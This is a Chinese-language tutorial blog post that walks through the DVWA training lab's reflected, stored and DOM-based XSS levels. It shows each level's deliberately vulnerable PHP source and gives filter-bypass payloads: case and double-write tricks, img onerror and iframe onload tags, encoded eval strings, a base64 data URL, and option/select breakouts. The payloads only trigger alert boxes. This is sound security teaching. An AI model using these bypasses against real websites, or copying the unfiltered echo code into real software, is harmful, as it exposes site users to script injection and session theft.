https://blog.csdn.net/m0_56010012/article/details/123663649
![image](https://github.com/minname1/tool/assets/153788696/3b4c6b28-0399-402b-b79f-26b5eb2243ab)
# XSS漏洞
跨站脚本攻击（Cross Site Scripting），为了不和层叠样式表（Cascading Style Sheets，缩写：CSS）混淆，所以架构跨站脚本攻击缩写为XSS。XSS就是攻击者在web页面插入恶意的Script代码，当用户浏览该页面时，嵌入其中的js代码会被执行，从而达到恶意攻击的目的。某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。

XSS的类型
XSS类型一般分为三种：

## 1.反射型XSS

反射型XSS只是简单的把用户输入的数据“反射”给浏览器，也就是需要诱使用户“点击”一个恶意链接，才能攻击成功。反射型XSS也叫作“非持久性XSS”

## 2.存储型XSS

存储型XSS会把用户输入的数据“存储”在服务器端。如果没有过滤或者过滤不严，那么这些恶意代码被服务器端接收并存储，用户访问该页面的时候触发代码执行。这种XSS具有很强的稳定性，当再次访问页面时会被执行。<持久化>.这种XSS比较危险，容易造成蠕虫，盗窃cookie等。

存储型XSS和反射型XSS、DOM型XSS相比，具有更高的隐蔽性，危害性也更大。它们之间最大的区别在于反射型XSS与DOM型XSS执行都必须依靠用户手动去触发，而存储型XSS却不需要。

## 3.DOM Based XSS

DOM的全称为Document Object Model，即文档对象模型，DOM通常用于代表在HTML、XHTML和XML中的对象。使用DOM可以允许程序和脚本动态低访问和更新文档的内容、结构和样式。

实际上，这种类型的XSS并非按照“数据是否保存在服务器端”来划分的，从效果上来说也是反射型XSS单独划分出来的，因为DOM Based XSS的形成原因比较特别。这是由于客户端脚本自身解析不正确导致的安全问题。

这种利用也需要受害者点击链接来触发，DOM型XSS是前端代码中存在了漏洞（DOM型的XSS是不需要与服务器交互的，它只发生在客户端处理数据阶段），而反射型是后端代码中存在了漏洞。

反射型和存储型xss是服务器端代码漏洞造成的，payload在响应页面中，在dom xss中，payload不在服务器发出的HTTP响应页面中，当客户端脚本运行时（渲染页面时），payload才会加载到脚本中执行。

# Vulnerability: Reflected Cross Site Scripting (XSS)
##　LOW
页面源代码：
```
  <?php
   
  header ("X-XSS-Protection: 0");
   
  // Is there any input?
  if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
      // Feedback for end user
      echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
  }
 
?> 
```
代码分析：直接采用get方式传入了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞。

（1）直接输入最简单的payload：<script>alert(/xss/)</script>测试是否存在XSS漏洞，大多数XSS漏洞可以利用该种方法检测。
```
<script>alert(/xss/)</script>
```

![image](https://github.com/minname1/tool/assets/153788696/9ed95436-35ad-4f18-8a6f-90d2accec68d)


## Medium
题目源代码：

``` 
Reflected XSS Source
vulnerabilities/xss_r/source/medium.php
<?php
 
header ("X-XSS-Protection: 0");
 
// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );
 
    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}
 
?>

```  
 

代码分析：这里很明显看得出来，是对script字符进行了过滤，使用str_replace()函数将输入中的script替换成为空，于是需要我们想办法绕过过滤字符。

1.双写绕过

``` 

<scr<script>ipt>alert(/xss/)</script>

``` 
2.大小写绕过

``` 
<ScRipt>alert(/xss/)</ScRipt>

``` 
可以弹框
![image](https://github.com/minname1/tool/assets/153788696/e77f8eb6-32af-4639-8972-9c364847a1e0)



# HIGH
页面源代码
``` 
<?php
 
header ("X-XSS-Protection: 0");
 
// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
 
    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}
 
?>
``` 
 针对特殊符号，均有过滤，使得双写绕过以及大小写混淆绕过失效。(正则表达式中的i表示不区分大小写)。

script标签失效，但是可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码。

1.采用img标签转换后的XSS payload：
``` 
<img src = 1 onerror = alert(/xss/)>
``` 
其他编码形式：
``` 
<img src=1 οnerrοr=eval("\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29")></img>
<img src=1 οnerrοr=eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41))></img>
<imgsrc=1οnerrοr=eval("\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0078\u0073\u0073\u0027\u0029")></img>
``` 
2.使用iframe标签：
``` 
<iframe οnlοad=alert(/xss/)>
``` 
使用DATA URL进行XSS:
``` 
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4="></object>
``` 
其中的“PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=”就等同于“<script>alert('xss')</script>”

# Vulnerability: Stored Cross Site Scripting (XSS)
## LOW
``` 
Stored XSS Source
vulnerabilities/xss_s/source/low.php
<?php
 
if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );
 
    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
 
    // Sanitize name input
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
 
    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
 
    //mysql_close();
}
 
?>
 ``` 
 

 相关函数介绍：

trim(string,charlist)函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括\0、\t、\n、\x0B、\r以及空格，可选参数charlist支持添加额外需要删除的字符。

mysqli_real_escape_string(string,connection)函数会对字符串中的特殊符号（\x00，\n，\r，\，'，"，\x1a）进行转义。

stripslashes(string)函数删除字符串中的反斜杠。

从代码中可以知道，对输入并没有做XSS方面的过滤以及检查，并且存储在数据库中，因此这里存在明显的存储型的XSS漏洞。经典payload: <script>alert(/xss/)</script>

1在界面输入经典payload，发现name框对输入长度有限制，因此将payload转而输入message框，发现可以成功注入。

![image](https://github.com/minname1/tool/assets/153788696/4d69da1d-149c-4de1-aaa1-926d676e9f38)


2

（1）修改name框的最大长度，让经典payload在name框也可以发挥作用。在网页web工具栏中 直接找到name输入框的属性设置，修改maxlength = “100”。
![image](https://github.com/minname1/tool/assets/153788696/f7059012-15ad-4a22-8ff7-c52a67bbfbf4)



 （2）直接在name框输入经典payload，发现对长度已经没有限制。


![image](https://github.com/minname1/tool/assets/153788696/cbc48f51-34e6-4f60-b982-a444400b710a)

（3）随便输入message的值，回显成功注入。


![image](https://github.com/minname1/tool/assets/153788696/42173acb-e3b7-409a-bdd6-511fa603d75f)

# Medium
 页面源代码
``` 
<?php
 
if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );
 
    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );
 
    // Sanitize name input
    $name = str_replace( '<script>', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
 
    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
 
    //mysql_close();
}
 
?> 
``` 
相关函数介绍：

strip_tags()函数剥去字符串中的HTML、XML以及PHP的标签，但允许使用<b>标签。

addslashes()函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。

并且message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了<script>，仍然存在存储型的XSS。

name框限制了输入长度，解决方式为修改maxlength的大小。

绕过方式，类似于反射型XSS，1.双写绕过。2.大小写混淆绕过。3.使用非script标签的xss payload。

# HIGH
``` 
<?php
 
if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );
 
    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );
 
    // Sanitize name input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
 
    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
 
    //mysql_close();
}
 
?> 
``` 
代码表示，虽然使用正则表达式过滤了<script>标签，但是却忽略了img、iframe等其它危险的标签，因此name参数依旧存在存储型XSS。

操作类似于反射型XSS的high。

# Vulnerability: DOM Based Cross Site Scripting (XSS)
## LOW
``` 
<?php
 
# No protections, anything goes
 
?> 
可以看到服务器端没有任何php代码，因此查看前端源代码，处理用户输入的只有前端的js代码。
![image](https://github.com/minname1/tool/assets/153788696/10a7b4de-efef-47fd-82b0-fa533a1764c7)



 因此尝试修改url中的default值，令它等于经典payload:<script>alert(/xss/)</script>。成功注入。

# Medium
<?php
 
// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    $default = $_GET['default'];
    
    # Do not allow script tags
    if (stripos ($default, "<script") !== false) {
        header ("location: ?default=English");
        exit;
    }
}
 
?>
``` 
从代码中可以看到，对<script>进行了过滤，并且将default的值设置为English。这里的script还设置了大小写绕过。

可以使用img标签来进行绕过。这里需要把option标签进行闭合才能发出。前面的low是利用设置default的值，把值进行url解码，然后在option标签中显示。而option标签中是不允许存在img图片标签的，所有需要闭合标签后才能触发。

构造payload:
``` 
</option></select><img src=1 οnerrοr=alert("1111")>
``` 
注入成功：

![image](https://github.com/minname1/tool/assets/153788696/3e27b522-d3a5-41df-9534-1b7808849831)


 额外的绕过方式：
规则检测只会检测default变量的东西，而不会检测X，使用&X也可以绕过。

“#”在PHP中，“#”后边是不接受的所以这里也可以绕过。

http://your ip/vulnerabilities/xss_d/?default=German&x=<script>alert(/xss/)</script>
http://your ip/vulnerabilities/xss_d/?default=German#<script>alert(/xss/)</script>
## HIGH
``` 
Unknown Vulnerability Source
vulnerabilities/xss_d/source/high.php
<?php
 
// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
 
    # White list the allowable languages
    switch ($_GET['default']) {
        case "French":
        case "English":
        case "German":
        case "Spanish":
            # ok
            break;
        default:
            header ("location: ?default=English");
            exit;
    }
}
 
?>
``` 

分析代码：default变量中的值，只允许French、English、German、Spanish中的一种才行，否则就会跳转结束运行。

这里可以采用上一种方式然后。payload:</option></select><iframe  οnlοad=alert("1231")></option>

绕过方式：
``` 
default=German&x=<script>alert(/xss/)</script>
default=German#<script>alert(/xss/)</script>
``` 
                        
原文链接：https://blog.csdn.net/m0_56010012/article/details/123663649
